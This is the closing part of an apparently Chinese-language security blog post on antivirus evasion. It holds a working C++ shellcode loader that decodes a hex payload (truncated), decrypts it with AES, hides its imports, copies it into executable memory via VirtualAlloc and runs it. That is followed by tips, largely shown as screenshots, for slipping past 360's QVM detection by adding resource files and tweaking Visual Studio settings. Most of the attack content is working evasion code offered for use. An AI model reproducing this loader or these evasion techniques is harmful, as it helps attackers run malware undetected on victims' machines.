class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unsigned char hexCharToByte(char character) &#123;</span><br><span class="line">    if (character &gt;&#x3D; &#39;0&#39; &amp;&amp; character &lt;&#x3D; &#39;9&#39;) &#123;</span><br><span class="line">        return character - &#39;0&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    if (character &gt;&#x3D; &#39;a&#39; &amp;&amp; character &lt;&#x3D; &#39;f&#39;) &#123;</span><br><span class="line">        return character - &#39;a&#39; + 10;</span><br><span class="line">    &#125;</span><br><span class="line">    if (character &gt;&#x3D; &#39;A&#39; &amp;&amp; character &lt;&#x3D; &#39;F&#39;) &#123;</span><br><span class="line">        return character - &#39;A&#39; + 10;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void ToBytes(const std::string&amp; hexString, unsigned char* byteArray, int byteArraySize) &#123;</span><br><span class="line">    for (int i &#x3D; 0; i &lt; hexString.length(); i +&#x3D; 2) &#123;</span><br><span class="line">        byteArray[i &#x2F; 2] &#x3D; hexCharToByte(hexString[i]) * 16 + hexCharToByte(hexString[i + 1]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">    string data &#x3D; &quot;93bf58b44d4d8c000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed5241514....&quot;;</span><br><span class="line">    ifstream ifs;</span><br><span class="line">    ifs.open(&quot;sss.txt&quot;, ios::in);</span><br><span class="line">    if (ifs.is_open()) &#123;</span><br><span class="line">        string line;</span><br><span class="line">        getline(ifs, line);</span><br><span class="line">        ifs.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    const size_t length &#x3D; data.size() &#x2F; 2; &#x2F;&#x2F; 字节长度</span><br><span class="line">    </span><br><span class="line">    unsigned char* buffer &#x3D; (unsigned char*)malloc(length);</span><br><span class="line">    &#x2F;&#x2F; 调用函数将十六进制字符串转换为字节型数组</span><br><span class="line">    ToBytes(data, buffer, length);</span><br><span class="line">    unsigned char key[] &#x3D; &quot;baidu.com&quot;;</span><br><span class="line">    AES_enc(key, buffer);</span><br><span class="line">    char* mypng &#x3D; (char*)LI_FN(VirtualAlloc)(nullptr, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    memcpy(mypng, buffer, length);</span><br><span class="line">    ((void(*) ())mypng)();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="添加资源"><a href="#添加资源" class="headerlink" title="添加资源"></a>添加资源</h2><p>绕过QVM</p>
<p>加资源文件即可</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240507104631466.png" alt="image-20240507104631466"></p>
<h2 id="vs配置免杀"><a href="#vs配置免杀" class="headerlink" title="vs配置免杀"></a>vs配置免杀</h2><p>主绕过QVM</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/UJlVvagNjmy9E-B-XjBHyw">https://mp.weixin.qq.com/s/UJlVvagNjmy9E-B-XjBHyw</a></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505181614551.png" alt="image-20240505181614551"></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505181628246.png" alt="image-20240505181628246"></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505181642420.png" alt="image-20240505181642420"></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505181653701.png" alt="image-20240505181653701"></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505181712675.png" alt="image-20240505181712675"></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505181809890.png" alt="image-20240505181809890"></p>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/09/03/Process-Injection2/" rel="prev" title="Process-Inject-贰">
                  <i class="fa fa-angle-left"></i> Process-Inject-贰
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/11/07/java-dll/" rel="next" title="初探java加载动态链接库">
                  初探java加载动态链接库 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Y0ng</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  





</body>
</html>
